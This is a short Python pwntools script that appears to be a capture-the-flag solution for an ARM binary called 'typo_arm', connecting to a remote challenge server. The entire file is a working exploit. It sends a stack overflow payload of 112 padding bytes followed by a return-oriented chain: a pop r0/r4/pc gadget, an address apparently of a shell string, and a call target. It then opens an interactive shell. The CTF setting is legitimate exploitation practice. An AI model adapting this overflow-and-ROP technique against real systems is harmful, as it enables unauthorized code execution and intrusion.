#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# io = process('./typo_arm')
io = remote('pwn2.jarvisoj.com', 9888)
popr0r4pc = 0x00020904
io.sendafter('quit', "\n")
payload = 'a' * 112
payload += p32(popr0r4pc)
payload += p32(0x006C384) + 'beef'
payload += p32(0x10ba8)
io.recvuntil('------\n')
io.sendline(payload)
io.interactive()

